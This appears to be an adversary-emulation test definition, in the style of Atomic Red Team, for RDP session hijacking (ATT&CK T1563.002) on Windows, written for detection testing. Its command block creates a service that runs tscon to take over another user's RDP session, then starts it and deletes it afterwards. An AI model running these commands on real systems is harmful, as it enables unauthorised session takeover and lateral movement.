  name: Soumaia ART Tests - RDP hijacking
  description: '[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization (requires elevation)'
  tactic: lateral-movement
  technique:
    attack_id: T1563.002
    name: 'Remote Service Session Hijacking: RDP Hijacking'
  platforms:
    windows:
      cmd:
        command: |-
          query user
          sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
          net start sesshijack
        cleanup: |-
          sc.exe delete sesshijack >nul 2>&1
